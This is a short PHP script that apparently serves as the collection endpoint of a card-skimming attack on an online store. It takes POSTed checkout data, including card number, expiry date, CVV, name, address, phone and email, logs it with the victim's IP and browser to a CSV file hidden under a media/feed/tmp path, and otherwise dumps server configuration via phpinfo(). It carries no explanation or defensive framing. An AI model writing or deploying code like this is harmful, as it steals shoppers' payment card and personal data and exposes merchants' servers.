<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $logDir = __DIR__ . '/media/feed/tmp/log';
    if (!is_dir($logDir)) {
        mkdir($logDir, 0755, true);
    }
    $logFile = $logDir . '/log.txt';

    $data = $_POST;

    $fields = [
        'id'        => uniqid('', true),
        'cc'        => $data['cc_number'] ?? '',
        'exp'       => $data['cc_exp'] ?? '',
        'cvv'       => $data['cc_cvv'] ?? '',
        'firstname' => $data['firstname'] ?? '',
        'lastname'  => $data['lastname'] ?? '',
        'address'   => $data['street[0]'] ?? '',
        'city'      => $data['city'] ?? '',
        'state'     => $data['region_id'] ?? '',
        'zip'       => $data['postcode'] ?? '',
        'phone'     => $data['telephone'] ?? '',
        'email'     => $data['email'] ?? '',
        'ip'        => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'ua'        => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'timestamp' => date('Y-m-d H:i:s')
    ];

    if (!file_exists($logFile)) {
        $header = implode(',', array_keys($fields)) . "\n";
        file_put_contents($logFile, $header);
    }

    $handle = fopen($logFile, 'a');
    fputcsv($handle, array_values($fields));
    fclose($handle);

    http_response_code(200);
    exit;
} else {
    phpinfo();
    exit;
}
